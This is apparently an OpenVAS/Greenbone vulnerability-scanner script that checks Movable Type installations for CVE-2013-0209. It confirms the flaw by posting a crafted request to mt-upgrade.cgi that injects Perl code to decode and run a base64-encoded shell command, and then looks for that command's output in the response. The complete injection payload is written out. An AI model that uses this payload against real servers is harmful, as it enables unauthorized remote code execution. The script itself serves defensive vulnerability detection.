CPE = "cpe:/a:sixapart:movable_type";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103651" );
	script_bugtraq_id( 57490 );
	script_cve_id( "CVE-2013-0209" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_name( "Movable Type Multiple SQL Injection and Command Injection Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/57490" );
	script_xref( name: "URL", value: "http://www.sixapart.com/movabletype/" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-01-31 13:27:06 +0100 (Thu, 31 Jan 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "mt_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "movabletype/detected" );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more details." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Movable Type is prone to multiple SQL-injection and command-injection
vulnerabilities because the application fails to properly sanitize user-supplied input.

Exploiting these issues could allow an attacker to execute arbitrary
code, compromise the application, access or modify data, or exploit
latent vulnerabilities in the underlying database.

Versions prior to Movable Type 4.38 are vulnerable." );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("url_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: port );
cmds = exploit_commands();
for cmd in keys( cmds ) {
	_cmd = base64( str: cmds[cmd] );
	_cmd = urlencode( str: _cmd );
	ex = "%5f%5fmode=run%5factions&installing=1&steps=%5b%5b%22core%5fdrop%5fmeta%5ffor%5ftable%22%2c%22class%22%2c%22v0%3buse%20" + "MIME%3a%3aBase64%3bsystem%28decode%5fbase64%28q%28" + _cmd + "%29%29%29%3breturn%200%22%5d%5d";
	len = strlen( ex );
	req = NASLString( "POST ", dir, "/mt-upgrade.cgi HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", len, "\\r\\n", "\\r\\n", ex );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(eregmatch( pattern: cmd, string: result )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

